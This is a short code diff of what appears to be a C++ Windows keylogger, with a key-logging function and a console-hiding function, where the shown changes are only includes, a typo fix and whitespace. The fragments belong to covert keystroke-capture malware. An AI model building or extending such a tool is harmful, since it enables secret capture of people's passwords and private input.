@@ -1,13 +1,14 @@
+
+
 #include <iostream>
 #include<fstream>
 #include <Windows.h>
 #include <time.h>
 #include<direct.h>
-#include <stdio.h>
-
+#include "main.h"
 
 #pragma warning(disable : 4996)
-//^this disables the error message about the key saving method not ebing safe
+//^this disables the error message about the key saving method not being safe
 
 void logfile(int key)
 {
@@ -21,7 +22,6 @@ void logfile(int key)
 	
 	
 }
-
 
 
 void hideconsole() 
@@ -40,6 +40,8 @@ int main()
 
 
 	hideconsole;
+
+
 
 
 	bool running = true;
